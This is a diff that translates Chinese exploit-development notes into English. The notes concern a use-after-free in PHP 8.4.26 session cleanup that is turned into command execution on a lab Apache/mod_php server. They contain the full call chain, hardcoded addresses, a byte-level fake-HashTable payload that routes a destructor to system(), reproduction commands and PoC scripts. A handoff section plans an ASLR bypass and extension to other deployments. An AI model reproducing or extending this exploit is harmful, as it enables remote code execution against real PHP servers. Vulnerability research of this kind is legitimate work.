@@ -1,24 +1,24 @@
-# PHP 8.4.26 session 漏洞复现笔记（Apache/mod_php, no-ASLR）
+# PHP 8.4.26 session vulnerability reproduction notes (Apache/mod_php, no-ASLR)
 
-日期：2026-10-21
-工作目录：`/Users/my/php2shell`
-远程实验机：`debian@172.16.1.112`（Debian 12, amd64, kernel 6.1.0-48）
+Date: 2026-10-21
+Working directory: `/Users/my/php2shell`
+Remote lab machine: `debian@172.16.1.112` (Debian 12, amd64, kernel 6.1.0-48)
 
 ---
 
-## 1. 结论摘要
+## 1. Summary of conclusions
 
-### 1.1 已达成
+### 1.1 Achieved
 
-- 在 **未修改的 PHP 8.4.26 源码**（官方 tarball 自编译）上，Apache 2.4.68 prefork + mod_php，**关闭 ASLR** 后取得真实命令执行。
-- 命令：`system("id>/tmp/x")`，实际写出的文件：
+- On **unmodified PHP 8.4.26 source** (self-compiled from the official tarball), Apache 2.4.68 prefork + mod_php, with **ASLR disabled**, we obtained real command execution.
+- Command: `system("id>/tmp/x")`; the file actually written:
 
 ```text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-- 连续 5 次独立请求全部成功（worker 每次崩溃后 prefork 重新拉起）。
-- gdb 命中：
+- 5 consecutive independent requests all succeeded (prefork respawns the worker after each crash).
+- gdb hits:
 
 ```text
 SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
@@ -30,28 +30,28 @@ SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
 ...
 ```
 
-- ASLR 对照：正常 `apache2ctl start`（personality=0）失败；`setarch x86_64 -R apache2ctl start`（personality=0x40000）成功。
+- ASLR control: normal `apache2ctl start` (personality=0) fails; `setarch x86_64 -R apache2ctl start` (personality=0x40000) succeeds.
 
-### 1.2 触发方式（本线）
+### 1.2 Trigger method (this line)
 
-利用脚本 `tools/d.php` 是一个带 `__destruct` 的测试页面：
+The exploit script `tools/d.php` is a test page with a `__destruct`:
 
 ```php
 session_start();
-$_SESSION["x"] = new X($fp, $payload);   // X::__destruct 会写 $_SESSION
+$_SESSION["x"] = new X($fp, $payload);   // X::__destruct writes $_SESSION
 for ($i = 0; $i < 7; $i++) $_SESSION["k".$i] = "v";
-session_unset();                         // 关键：对仍被 $_SESSION 引用的数组做 zend_hash_clean
+session_unset();                         // key: zend_hash_clean on the array still referenced by $_SESSION
 ```
 
-`session_unset()` → `zend_hash_clean($_SESSION 数组)`。清理到对象 X 时调用 `X::__destruct`，析构器写 `$_SESSION["pwn"]`，触发同一个 HashTable 的 `zend_hash_do_resize()`，释放旧 `arData`；外层 `zend_hash_clean` 仍用进入循环前缓存的 `p/end` 继续遍历，形成 heap-use-after-free。析构器随后用 `stream_bucket_new()` 分配一个内容完全可控的 320 字节裸缓冲，重占刚释放的 `arData` 分配块；clean 继续把这块数据当 Bucket 处理，最终走到 fake HashTable 的 `pDestructor = system`。
+`session_unset()` → `zend_hash_clean($_SESSION array)`. When cleaning reaches object X it calls `X::__destruct`; the destructor writes `$_SESSION["pwn"]`, triggering `zend_hash_do_resize()` on the same HashTable and freeing the old `arData`; the outer `zend_hash_clean` continues iterating with the `p/end` cached before entering the loop, producing a heap-use-after-free. The destructor then uses `stream_bucket_new()` to allocate a fully content-controlled 320-byte raw buffer that reclaims the just-freed `arData` chunk; clean continues to treat this data as Buckets and finally reaches the fake HashTable's `pDestructor = system`.
 
-> **边界**：这是“缺陷 D”的利用化，需要目标脚本调用 `session_unset()` 并存在一个会写 `$_SESSION` 的析构器（或应用里等价的 gadget）。它不是“纯 `session.upload_progress`、零应用配合”的公网利用链。upload_progress 线的进展见第 5 节。
+> **Boundary**: this is the weaponization of "Defect D"; it requires the target script to call `session_unset()` and to have a destructor that writes `$_SESSION` (or an equivalent gadget in the application). It is not a "pure `session.upload_progress`, zero application cooperation" internet-facing exploit chain. See Section 5 for progress on the upload_progress line.
 
 ---
 
-## 2. 实验环境
+## 2. Lab environment
 
-### 2.1 PHP 构建
+### 2.1 PHP build
 
 ```bash
 mkdir -p ~/php-lab && cd ~/php-lab
@@ -63,13 +63,13 @@ tar xzf php-8.4.26.tar.gz && cd php-8.4.26
 make -j16 && sudo make install
 ```
 
-产物：`/usr/lib/apache2/modules/libphp.so`、`/opt/php8426/bin/php`（`PHP 8.4.26 (cli) (NTS)`）。
+Products: `/usr/lib/apache2/modules/libphp.so`, `/opt/php8426/bin/php` (`PHP 8.4.26 (cli) (NTS)`).
 
 ### 2.2 Apache
 
-- `mpm_prefork`，单 worker：`StartServers 1 / MinSpareServers 1 / MaxSpareServers 1 / ServerLimit 1 / MaxRequestWorkers 1 / MaxConnectionsPerChild 0`。
-- `KeepAlive Off`，监听 `127.0.0.1:8088`，DocumentRoot `/home/debian/php-lab/www`。
-- 关键 PHP 配置（`/etc/apache2/conf-available/php8426.conf`）：
+- `mpm_prefork`, single worker: `StartServers 1 / MinSpareServers 1 / MaxSpareServers 1 / ServerLimit 1 / MaxRequestWorkers 1 / MaxConnectionsPerChild 0`.
+- `KeepAlive Off`, listening on `127.0.0.1:8088`, DocumentRoot `/home/debian/php-lab/www`.
+- Key PHP configuration (`/etc/apache2/conf-available/php8426.conf`):
 
 ```apache
 php_admin_value memory_limit 8M
@@ -82,39 +82,39 @@ php_admin_value session.upload_progress.enabled On
 php_admin_value session.upload_progress.cleanup On
 ```
 
-> `memory_limit 8M` 是为了让 upload_progress 线稳定 OOM；RCE 线本身不依赖该值。
+> `memory_limit 8M` is to make the upload_progress line OOM reliably; the RCE line itself does not depend on that value.
 
-### 2.3 关闭 ASLR
+### 2.3 Disabling ASLR
 
 ```bash
 sudo apache2ctl -k stop
 sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
-# 验证
+# verify
 sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
 # 00040000
 ```
 
-无 ASLR 下，同一配置的全新 worker 地址稳定（见第 4 节地址表）。
+Under no ASLR, fresh workers with the same configuration have stable addresses (see the address table in Section 4).
 
 ---
 
-## 3. 缺陷 D：会话树清理重入 → arData UAF
+## 3. Defect D: session tree cleanup reentrancy → arData UAF
 
-### 3.1 调用链
+### 3.1 Call chain
 
 ```text
 zif_session_unset()                     ext/session/session.c
-  zend_hash_clean(ht = $_SESSION 数组)   Zend/zend_hash.c
-    ht->pDestructor(&p->val)            // 处理对象 X，调用 X::__destruct
+  zend_hash_clean(ht = $_SESSION array)   Zend/zend_hash.c
+    ht->pDestructor(&p->val)            // process object X, call X::__destruct
       X::__destruct()
-        $_SESSION["pwn"] = ...          // 写回同一个数组
-          zend_hash_do_resize(ht)       // 表满，扩容
+        $_SESSION["pwn"] = ...          // write back to the same array
+          zend_hash_do_resize(ht)       // table full, grow
             pemalloc(new arData)
             memcpy(new arData, old arData, nNumUsed)
-            pefree(old arData)          // ★ 旧 arData 被释放
-        stream_bucket_new(fp, payload320) // ★ 320 字节裸缓冲重占旧 arData
-      // 回到 zend_hash_clean 的循环：
-      p++ 继续遍历已被重占的旧 arData   // ★ UAF，读 attacker-controlled Bucket
+            pefree(old arData)          // ★ old arData freed
+        stream_bucket_new(fp, payload320) // ★ 320-byte raw buffer reclaims old arData
+      // back in the zend_hash_clean loop:
+      p++ continues iterating over the reclaimed old arData   // ★ UAF, reads attacker-controlled Bucket
         ht->pDestructor(&p->val)         // ZVAL_PTR_DTOR
           zend_array_destroy(fake_ht)
             zend_hash_destroy(fake_ht)
@@ -122,58 +122,58 @@ zif_session_unset()                     ext/session/session.c
                 system("id>/tmp/x")     // ★ RCE
 ```
 
-关键源码：
+Key source:
 
-- `session_unset()`：`ext/session/session.c`（`PHP_FUNCTION(session_unset)`，8.4.26 约 2756–2773 行）。
-- `zend_hash_clean()`：`Zend/zend_hash.c` 约 1885–1932 行；循环用局部 `Bucket *p, *end`，在 `pDestructor` 返回后继续 `++p`。
-- `zend_hash_do_resize()`：`Zend/zend_hash.c:1327`；扩容后 `pefree(old_data, ...)`。
-- `zend_array_destroy()`：`Zend/zend_hash.c:1815`；`zend_hash_destroy()`：`Zend/zend_hash.c:1734`。
-- `stream_bucket_new()`：`ext/standard/user_filters.c:472`；`pemalloc(buffer_len)` 后 `memcpy`，内容完全可控，且 bucket 资源保活。
-- `zend_hash_update_ind` 的 dtor-before-store 窗口：`Zend/zend_hash.c` 的 `_zend_hash_add_or_update_i()`，约 872 行。
+- `session_unset()`: `ext/session/session.c` (`PHP_FUNCTION(session_unset)`, around lines 2756–2773 in 8.4.26).
+- `zend_hash_clean()`: `Zend/zend_hash.c` around lines 1885–1932; the loop uses local `Bucket *p, *end` and continues with `++p` after `pDestructor` returns.
+- `zend_hash_do_resize()`: `Zend/zend_hash.c:1327`; after growing, `pefree(old_data, ...)`.
+- `zend_array_destroy()`: `Zend/zend_hash.c:1815`; `zend_hash_destroy()`: `Zend/zend_hash.c:1734`.
+- `stream_bucket_new()`: `ext/standard/user_filters.c:472`; `pemalloc(buffer_len)` followed by `memcpy`, content fully controllable, and the bucket resource keeps it alive.
+- The dtor-before-store window of `zend_hash_update_ind`: `_zend_hash_add_or_update_i()` in `Zend/zend_hash.c`, around line 872.
 
-### 3.2 实测地址（本构建、本配置、no-ASLR worker）
+### 3.2 Measured addresses (this build, this configuration, no-ASLR worker)
 
-| 对象 | 地址 |
+| Object | Address |
 |---|---|
 | session HashTable A | `0x7ffff5e031c0` |
-| A 的 arData（8 buckets） | `0x7ffff5e04540` |
-| arData 所在 320-byte 分配块起点 S | `0x7ffff5e04500` |
-| fake zval（clean 的 bucket 1） | `S+0x60 = 0x7ffff5e04560` |
+| A's arData (8 buckets) | `0x7ffff5e04540` |
+| Start S of the 320-byte allocation chunk containing arData | `0x7ffff5e04500` |
+| fake zval (clean's bucket 1) | `S+0x60 = 0x7ffff5e04560` |
 | fake HashTable | `S+0x80 = 0x7ffff5e04580` |
-| fake Bucket / 命令字符串 | `S+0xa0 = 0x7ffff5e045a0` |
+| fake Bucket / command string | `S+0xa0 = 0x7ffff5e045a0` |
 | libc `system` | `0x7ffff7d13490` |
 | `ps_globals` | `0x7ffff56c2880` |
 | `executor_globals` | `0x7ffff56d8380` |
 
-实测 A 的 `nTableSize=8`、`nTableMask=0xfffffff0`（hash 区 0x40 字节），因此 `arData = S+0x40`。这与 `g17_clean_mask.log` 一致。
+Measured A has `nTableSize=8`, `nTableMask=0xfffffff0` (hash area 0x40 bytes), so `arData = S+0x40`. This matches `g17_clean_mask.log`.
 
-### 3.3 320 字节 payload 布局
+### 3.3 320-byte payload layout
 
-payload 以 `stream_bucket_new()` 的裸缓冲形式落到 `S = 0x7ffff5e04500`。clean 循环的 bucket 0 是对象 X（析构后，clean 还会读它的 `key`，位于 `S+0x58`，必须为 0）；bucket 1 位于 `arData+0x20 = S+0x60`。
+The payload lands at `S = 0x7ffff5e04500` as a raw buffer from `stream_bucket_new()`. Bucket 0 of the clean loop is object X (after destruction, clean still reads its `key`, located at `S+0x58`, which must be 0); bucket 1 is at `arData+0x20 = S+0x60`.
 
-| 偏移 | 内容 | 说明 |
+| Offset | Content | Description |
 |---|---|---|
-| `0x00–0x3f` | 0 | 未被 clean 读取的 hash 前缀区 |
-| `0x40–0x5f` | 0 | bucket 0 的 val/h；`0x58` 是 bucket 0 key，必须为 0 |
-| `0x60` | `S+0x80`（8 字节） | bucket 1 的 fake zval.value → fake HashTable |
-| `0x68` | `0x307`（8 字节） | zval type_info = IS_ARRAY_EX |
+| `0x00–0x3f` | 0 | hash prefix area not read by clean |
+| `0x40–0x5f` | 0 | bucket 0 val/h; `0x58` is bucket 0 key and must be 0 |
+| `0x60` | `S+0x80` (8 bytes) | bucket 1 fake zval.value → fake HashTable |
+| `0x68` | `0x307` (8 bytes) | zval type_info = IS_ARRAY_EX |
 | `0x70` | 0 | bucket 1 h |
 | `0x78` | 0 | bucket 1 key |
 | `0x80` | `01 00 00 00 07 00 00 00` | fake HashTable gc: refcount=1, type=IS_ARRAY |
 | `0x88` | `10 00 00 00 f8 ff ff ff` | flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8 |
 | `0x90` | `S+0xa0` | fake HashTable.arData |
 | `0x98` | `01 00 00 00 01 00 00 00` | nNumUsed=1, nNumOfElements=1 |
-| `0xa0` | `"id>/tmp/"` | fake Bucket.val.value（命令前 8 字节） |
-| `0xa8` | `0x78`（8 字节） | fake zval type_info：低字节 `'x'`，其后为 0 → 命令以 `x\0` 结束 |
-| `0xb0` | `system` 地址 | fake HashTable.pDestructor |
+| `0xa0` | `"id>/tmp/"` | fake Bucket.val.value (first 8 bytes of the command) |
+| `0xa8` | `0x78` (8 bytes) | fake zval type_info: low byte `'x'`, followed by 0 → command ends with `x\0` |
+| `0xb0` | `system` address | fake HashTable.pDestructor |
 
-`zend_hash_destroy(fake_ht)` 进入 `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` 分支，调用 `pDestructor(&p->val)`，即 `system(S+0xa0)`；字符串为 `id>/tmp/x`。
+`zend_hash_destroy(fake_ht)` enters the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` branch and calls `pDestructor(&p->val)`, i.e. `system(S+0xa0)`; the string is `id>/tmp/x`.
 
-> fake HashTable 的 `HT_GET_DATA_ADDR` 是 `arData - 32 = S+0x80`（不是分配起点），因此 system 返回后 `pefree()` 可能 abort/破坏堆；命令在 abort 前已经执行，proof 文件已写出。若需要“干净返回”，可把 fake HashTable 放到 S、把 arData 指向另一个可控分配块，或用两次 `stream_bucket_new` 分别提供 HT 与 data（见第 7 节）。
+> The fake HashTable's `HT_GET_DATA_ADDR` is `arData - 32 = S+0x80` (not the allocation start), so after system returns `pefree()` may abort/corrupt the heap; the command has already executed before the abort and the proof file has been written. If a "clean return" is needed, place the fake HashTable at S and point arData to another controllable allocation chunk, or use two `stream_bucket_new` calls to provide the HT and data separately (see Section 7).
 
-### 3.4 复现证据
+### 3.4 Reproduction evidence
 
-- 5/5 运行输出（远程）：
+- 5/5 run output (remote):
 
 ```text
 RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -181,7 +181,7 @@ RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-- ASLR 对照：
+- ASLR control:
 
 ```text
 ASLR_ON: personality=00000000
@@ -190,31 +190,31 @@ ASLR_OFF: personality=00040000
 ASLR_OFF_OK: uid=33(www-data) ...
 ```
 
-- 完整 gdb 证据：`logs/g16_system_trace.log`。
-- UAF 时旧 arData 内容/落点：`logs/g15_uaf_memory.log`。
-- 真实数组 mask/分配起点：`logs/g17_clean_mask.log`。
+- Full gdb evidence: `logs/g16_system_trace.log`.
+- Old arData content/landing point during UAF: `logs/g15_uaf_memory.log`.
+- Real array mask/allocation start: `logs/g17_clean_mask.log`.
 
 ---
 
-## 4. `session.upload_progress` 跨请求线（独立复现进展）
+## 4. `session.upload_progress` cross-request line (independent reproduction progress)
 
-这一节是情报中的主路径。本线已复现到 **跨请求残留 + 可重复崩溃**，尚未把 fake HashTable 链完全迁移过来；但机制、地址和 harness 都已确认。
+This section is the main path from the intelligence. This line has been reproduced to the point of **cross-request residue + reproducible crash**, but the fake HashTable chain has not yet been fully migrated over; however, the mechanism, addresses, and harness are all confirmed.
 
-### 4.1 请求 A：OOM bailout 留下跨请求状态
+### 4.1 Request A: OOM bailout leaves cross-request state
 
-请求 A（`tools/sup_poc.py a`）：
+Request A (`tools/sup_poc.py a`):
 
-- `Content-Type: multipart/form-data`，字段顺序：
+- `Content-Type: multipart/form-data`, field order:
   1. `PHPSESSID=attacksessionid0001`
   2. `PHP_SESSION_UPLOAD_PROGRESS=pwn`
-  3. 文件字段（触发 `MULTIPART_EVENT_FILE_START`，session 初始化）
-  4. 约 12MB 的普通字段（在 session 初始化之后触发 `memory_limit` OOM）
-- 实测：返回 200 + `Allowed memory size of 8388608 bytes exhausted`，session 文件 `/tmp/sess_attacksessionid0001`（321 字节）已写出。
-- gdb trace 显示：
-  - `php_request_startup` 进入；
-  - `php_session_track_init` 时 `PS(http_session_vars)=NULL`（本请求首次初始化）；
-  - OOM 后 **没有** 命中 `php_request_shutdown` / `zend_deactivate` / `shutdown_memory_manager`。
-- 请求结束后 `ps_globals` 仍保留：
+  3. file field (triggers `MULTIPART_EVENT_FILE_START`, session initialization)
+  4. approximately 12MB normal field (triggers `memory_limit` OOM after session initialization)
+- Measured: returns 200 + `Allowed memory size of 8388608 bytes exhausted`, and the session file `/tmp/sess_attacksessionid0001` (321 bytes) has been written.
+- gdb trace shows:
+  - `php_request_startup` is entered;
+  - at `php_session_track_init`, `PS(http_session_vars)=NULL` (first initialization in this request);
+  - after OOM, `php_request_shutdown` / `zend_deactivate` / `shutdown_memory_manager` are **not** hit.
+- After the request ends, `ps_globals` still retains:
 
 ```text
 ps_globals.http_session_vars: type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
@@ -223,17 +223,17 @@ ps_globals.id: 0x7ffff5e600c0
 ps_globals.session_status: active(1)
 ```
 
-`refcount=2` 对应 `ZVAL_NEW_REF` 的第一次引用 + `Z_ADDREF_P` 为 symbol table 预留的一次；说明 symbol table 中的 `_SESSION` 仍在，且请求堆未被正常 shutdown。
+`refcount=2` corresponds to the first reference from `ZVAL_NEW_REF` plus one reserved by `Z_ADDREF_P` for the symbol table; this indicates that `_SESSION` in the symbol table is still present and the request heap was not shut down normally.
 
-### 4.2 请求 B：END cleanup 绕过 FILE_START 的 rinit
+### 4.2 Request B: END cleanup bypasses FILE_START's rinit
 
-请求 B（`tools/sup_poc.py b`）只发：
+Request B (`tools/sup_poc.py b`) sends only:
 
 - `PHPSESSID`
 - `PHP_SESSION_UPLOAD_PROGRESS`
-- **没有文件字段**
+- **no file field**
 
-于是不会触发 `MULTIPART_EVENT_FILE_START` 里的 `php_rinit_session(0)`；在 `MULTIPART_EVENT_END` 时：
+Thus `php_rinit_session(0)` in `MULTIPART_EVENT_FILE_START` is not triggered; at `MULTIPART_EVENT_END`:
 
 ```text
 php_session_rfc1867_callback(MULTIPART_EVENT_END)
@@ -242,69 +242,69 @@ php_session_rfc1867_callback(MULTIPART_EVENT_END)
       php_session_track_init()
 ```
 
-`php_session_track_init()` 第一件事是 `zend_delete_global_variable("_SESSION")`。symbol table 中的 `_SESSION` 是 **IS_INDIRECT** 指向 `PS.http_session_vars`：
+`php_session_track_init()` first does `zend_delete_global_variable("_SESSION")`. `_SESSION` in the symbol table is **IS_INDIRECT** pointing to `PS.http_session_vars`:
 
-- `zend_hash_del_ind()` 跟随 indirect，把目标 zval 置 UNDEF 并调用 dtor；**bucket 本身保留**。
-- 随后 `zend_hash_update_ind()` 又找到这个 indirect bucket，跟随到 `PS.http_session_vars`，在 **store 之前** 对 `data` 调 `pDestructor`（`_zend_hash_add_or_update_i` 的 dtor-before-store 窗口）。
+- `zend_hash_del_ind()` follows the indirect, sets the target zval to UNDEF and calls the dtor; **the bucket itself remains**.
+- Then `zend_hash_update_ind()` finds this indirect bucket again, follows it to `PS.http_session_vars`, and calls `pDestructor` on `data` **before storing** (the dtor-before-store window of `_zend_hash_add_or_update_i`).
 
-实测 gdb：
+Measured gdb:
 
 ```text
 TRACK psvars=0x7ffff5e02320 ti=10a
-PS_DTOR type=10a ptr=0x7ffff5e02320     # 旧引用 rc 2 -> 1
-PS_DTOR type=10a ptr=0x7ffff5e01240     # update_ind 对新建引用做 dtor
+PS_DTOR type=10a ptr=0x7ffff5e02320     # old reference rc 2 -> 1
+PS_DTOR type=10a ptr=0x7ffff5e01240     # update_ind calls dtor on the newly created reference
 TRACK psvars=0x7ffff5e01240 ti=0
 REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
 ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0 ...
 ...
-SIGSEGV in _IO_new_fclose(fp=0xffffffff)   # php_handler 收尾时脚本文件句柄已被踩坏
+SIGSEGV in _IO_new_fclose(fp=0xffffffff)   # script file handle already corrupted when php_handler tears down
 ```
 
-B 请求还会出现：
+Request B also emits:
 
 ```text
 PHP Request Startup: Session ID is too long or contains illegal characters
 PHP Request Startup: Failed to read session data: files (path: /tmp)
 ```
 
-原因是 `PS.id` 仍指向请求 A 的已释放 `zend_string`，B 的 END cleanup 直接用了它，而不是 `progress->sid`。
+The reason is that `PS.id` still points to request A's freed `zend_string`, and B's END cleanup uses it directly instead of `progress->sid`.
 
-### 4.3 目前缺的是什么
+### 4.3 What is still missing
 
-- 跨请求路径已经能拿到：`PS.http_session_vars` 悬空引用、`PS.id` 悬空 `zend_string`、symbol table indirect bucket、`update_ind` dtor-before-store、可重复 SIGSEGV/SIGABRT。
-- 但还没有把“受控 320 字节 arData 重占 + fake HashTable”接到这条路径上。原因是：
-  - 请求 B 的 END cleanup 发生在脚本执行之前，攻击者可控的 multipart 字段分配虽然发生在它之前，但 `track_init` 创建的数组/引用地址和释放顺序与缺陷 D 不同；
-  - 请求 B 的第一次 `track_init` 会把旧引用 rc 2→1（不析构），第二次脚本内 `session_start()` 才会触发 `zend_delete_global_variable`/`REF_DESTROY`；
-  - 该路径最终常表现为 stream/file handle 被踩坏（`fclose(0xffffffff)`），不是可控 `pDestructor`。
-- 可复用的部件：`stream_bucket_new()` 320 字节裸喷、fake zval/fake HashTable 布局、`system` 地址、无 ASLR 下的地址稳定性。
+- The cross-request path can already obtain: dangling `PS.http_session_vars` reference, dangling `PS.id` `zend_string`, symbol-table indirect bucket, `update_ind` dtor-before-store, reproducible SIGSEGV/SIGABRT.
+- But the "controlled 320-byte arData reclaim + fake HashTable" has not been connected to this path. The reasons:
+  - Request B's END cleanup happens before script execution; although attacker-controlled multipart field allocations happen before it, the array/reference addresses created by `track_init` and the free order differ from Defect D;
+  - Request B's first `track_init` decrements the old reference rc 2→1 (no destruction); only the second call, the in-script `session_start()`, triggers `zend_delete_global_variable`/`REF_DESTROY`;
+  - this path often ends with a corrupted stream/file handle (`fclose(0xffffffff)`), not a controllable `pDestructor`.
+- Reusable components: 320-byte raw spray via `stream_bucket_new()`, fake zval/fake HashTable layout, `system` address, address stability under no ASLR.
 
 ---
 
-## 5. 与上一阶段情报的关系
+## 5. Relation to the previous-stage intelligence
 
-上一阶段截图中的链路是：
+The chain in the previous-stage screenshot is:
 
 ```text
-请求 A（upload_progress + OOM）
-请求 B（同 worker，RFC1867 buffer 重占）
+Request A (upload_progress + OOM)
+Request B (same worker, RFC1867 buffer reclaim)
 zval_ptr_dtor → zend_array_destroy → pDestructor → zend_call_function → zif_system
 ```
 
-本线独立复现了其中 **同样的 session 内部缺陷族**，并打通了：
+This line independently reproduced **the same family of internal session defects** and achieved:
 
-- `session_unset → zend_hash_clean → 对象析构写 $_SESSION → resize 释放 arData → UAF`；
-- 用 `stream_bucket_new` 的 320 字节裸缓冲重占 UAF 块；
-- fake zval → fake HashTable → `pDestructor=system` 的完整 RCE 链。
+- `session_unset → zend_hash_clean → object destructor writes $_SESSION → resize frees arData → UAF`;
+- reclaiming the UAF chunk with a 320-byte raw buffer from `stream_bucket_new`;
+- the full RCE chain fake zval → fake HashTable → `pDestructor=system`.
 
-差别是本线用 `session_unset()` + `__destruct` 作为触发/重入手段，而上一阶段声称用纯 upload_progress 跨请求内存布局直接伪造 HashTable。两者可以合并：把本线的 fake HashTable payload 复用到 upload_progress 线上，或反过来用上一阶段的跨请求原语替换本线的应用级析构器。
+The difference is that this line uses `session_unset()` + `__destruct` as the trigger/reentry mechanism, whereas the previous stage claimed to use pure upload_progress cross-request memory layout to forge the HashTable directly. The two can be merged: reuse this line's fake HashTable payload on the upload_progress line, or conversely replace this line's application-level destructor with the previous stage's cross-request primitive.
 
 ---
 
-## 6. 复现命令（从零）
+## 6. Reproduction commands (from scratch)
 
-### 6.1 环境
+### 6.1 Environment
 
-见第 2 节。确认：
+See Section 2. Confirm:
 
 ```bash
 /opt/php8426/bin/php -v           # PHP 8.4.26
@@ -313,7 +313,7 @@ sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
 # 00040000
 ```
 
-### 6.2 部署 PoC
+### 6.2 Deploying the PoC
 
 ```bash
 scp tools/d.php debian@172.16.1.112:/home/debian/php-lab/d.php
@@ -331,152 +331,152 @@ cat /tmp/x
 scp tools/sup_poc.py debian@172.16.1.112:/home/debian/php-lab/
 ssh debian@172.16.1.112
 cd ~/php-lab
-python3 sup_poc.py a   # 请求 A：OOM，留下跨请求状态
-python3 sup_poc.py b   # 请求 B：END cleanup，观察崩溃/警告
+python3 sup_poc.py a   # Request A: OOM, leaving cross-request state
+python3 sup_poc.py b   # Request B: END cleanup, observe crash/warnings
 ```
 
-> `sup_poc.py` 的 B 请求默认不带文件字段；这正是绕过 `php_rinit_session(0)` 的关键。加上 `B_REF_HEX` / `B_HT_HEX` 环境变量可以向 B 追加 `ref`/`ht` 字段，用于后续堆喷实验。
+> By default, the B request in `sup_poc.py` has no file field; this is exactly the key to bypassing `php_rinit_session(0)`. Adding the `B_REF_HEX` / `B_HT_HEX` environment variables appends `ref`/`ht` fields to B for subsequent heap-spray experiments.
 
 ---
 
-## 7. 下一步建议（交接）
+## 7. Recommended next steps (handoff)
 
-1. **把 fake HashTable 接进 upload_progress 线**
-   - 在请求 B 的 multipart 字段/边界中放置 320 字节类分配，观察 END cleanup 时 `php_session_track_init` 附近释放/重占的块；
-   - 复用本线 payload 布局，但需重新测量 A/arData/S 地址（B 的分配序列不同）。
-2. **让 RCE 更“干净”**
-   - 把 fake HashTable 放在 S（分配起点），`arData=S+0x40`、mask=0xfffffff0，使 `HT_GET_DATA_ADDR=S`；另一个 `stream_bucket_new` 提供独立 data 块，避免 double free/interior free。
-3. **ASLR 绕过**
-   - 上一阶段的情报提到用 mbstring 泄漏堆基址；本线的 `stream_bucket_new` 布局和 `system` 偏移可直接复用。先拿 heap base，再计算 S/A；libc base 用任意 leak 或 format-string 原语。
+1. **Connect the fake HashTable to the upload_progress line**
+   - Place 320-byte-class allocations in request B's multipart fields/boundaries, and observe the chunks freed/reclaimed around `php_session_track_init` during END cleanup;
+   - reuse this line's payload layout, but re-measure A/arData/S addresses (B's allocation sequence differs).
+2. **Make the RCE "cleaner"**
+   - Place the fake HashTable at S (the allocation start), with `arData=S+0x40`, mask=0xfffffff0, so that `HT_GET_DATA_ADDR=S`; use another `stream_bucket_new` to provide a separate data chunk, avoiding double free/interior free.
+3. **ASLR bypass**
+   - The previous-stage intelligence mentions leaking the heap base with mbstring; this line's `stream_bucket_new` layout and `system` offset can be reused directly. First obtain the heap base, then compute S/A; obtain the libc base with an arbitrary leak or format-string primitive.
 4. **PHP-FPM**
-   - 缺陷 D 是单请求原语；若 FPM 应用会调用 `session_unset()` 且存在会写 `$_SESSION` 的析构器，理论上同样适用。跨请求 PS 残留不适用于 FPM（bailout 后 worker 会被替换，上一阶段已确认）。
-5. **版本覆盖**
-   - 本笔记基于 8.4.26。上一阶段称 5.4/5.6/7.4/8.5 也有同类原语；若要写 1day 报告，需在各版本重新测量 HashTable/GC 布局与 `stream_bucket_new` 可用性。
+   - Defect D is a single-request primitive; if an FPM application calls `session_unset()` and has a destructor that writes `$_SESSION`, it should in theory apply equally. Cross-request PS residue does not apply to FPM (the worker is replaced after bailout, as confirmed in the previous stage).
+5. **Version coverage**
+   - These notes are based on 8.4.26. The previous stage claims 5.4/5.6/7.4/8.5 have similar primitives; to write a 1day report, the HashTable/GC layout and `stream_bucket_new` availability must be re-measured on each version.
 
 ---
 
-## 8. 关键文件/日志索引
+## 8. Key files/log index
 
-| 路径 | 内容 |
+| Path | Content |
 |---|---|
-| `tools/d.php` | no-ASLR RCE PoC（硬编码地址 + 320B payload） |
+| `tools/d.php` | no-ASLR RCE PoC (hardcoded addresses + 320B payload) |
 | `tools/sup_poc.py` | upload_progress A/B multipart harness |
-| `logs/g16_system_trace.log` | gdb 命中 `system("id>/tmp/x")` 的完整回溯 |
-| `logs/g15_uaf_memory.log` | 旧 arData 被 320B 喷块重占后的内存 |
-| `logs/g17_clean_mask.log` | 真实 session 数组 `nTableMask=0xfffffff0`、分配起点 |
-| `src/php-8.4.26/` | 官方源码（分析用） |
+| `logs/g16_system_trace.log` | full backtrace of the gdb hit on `system("id>/tmp/x")` |
+| `logs/g15_uaf_memory.log` | memory after the old arData is reclaimed by the 320B spray chunk |
+| `logs/g17_clean_mask.log` | real session array `nTableMask=0xfffffff0`, allocation start |
+| `src/php-8.4.26/` | official source (for analysis) |
 
 ---
 
-## 9. 备注与风险
+## 9. Notes and risks
 
-- 远程实验机的 `/tmp/x`、`/tmp/destruct_done`、`/tmp/core.*` 可能残留；测试前用 `sudo rm -f` 清理。
-- 本 PoC 依赖固定 PHP 构建/配置/启动顺序；换构建后需要重新测量 gadget 偏移和 S 偏移。
-- 无 ASLR 版（`tools/d.php`）硬编码 `system` 地址；ASLR 版（第 10 节）用两个泄漏动态计算，不需要硬编码基址。
-- 本线的“RCE”是应用级触发（`session_unset` + 析构器）。对外报告时不要把它描述成“纯 upload_progress 无应用配合”的利用；upload_progress 线的纯 RCE 仍需第 7 节的合并工作。
+- `/tmp/x`, `/tmp/destruct_done`, `/tmp/core.*` may remain on the remote lab machine; clean them with `sudo rm -f` before testing.
+- This PoC depends on a fixed PHP build/configuration/startup order; after changing the build, gadget offsets and the S offset must be re-measured.
+- The no-ASLR version (`tools/d.php`) hardcodes the `system` address; the ASLR version (Section 10) computes it dynamically from two leaks and does not need a hardcoded base address.
